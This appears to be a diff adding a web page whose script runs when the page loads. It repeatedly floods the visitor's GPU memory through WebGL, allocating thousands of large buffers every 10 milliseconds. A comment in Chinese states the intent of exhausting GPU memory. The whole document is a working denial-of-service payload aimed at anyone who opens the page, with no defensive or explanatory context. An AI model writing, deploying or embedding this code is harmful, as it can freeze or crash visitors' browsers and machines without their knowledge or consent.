@@ -1,0 +1,34 @@
+<body>
+    <canvas id="glcanvas" width="8192" height="8192"></canvas>
+    <script>
+        function createWebGLContext() {
+            const canvas = document.getElementById('glcanvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) {
+                alert('WebGL not supported');
+                return null;
+            }
+            return gl;
+        }
+    
+        function floodGPU(gl) {
+            let buffers = [];
+            for (let i = 0; i < 10000; i++) {
+                const buffer = gl.createBuffer();
+                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(1000000), gl.STATIC_DRAW);
+                buffers.push(buffer);
+            }
+        }
+    
+        function startFlood() {
+            const gl = createWebGLContext();
+            if (!gl) return;
+            setInterval(() => {
+                floodGPU(gl);
+            }, 10); // 每 10ms 尝试炸 GPU 内存
+        }
+    
+        startFlood();
+    </script>
+    </body>
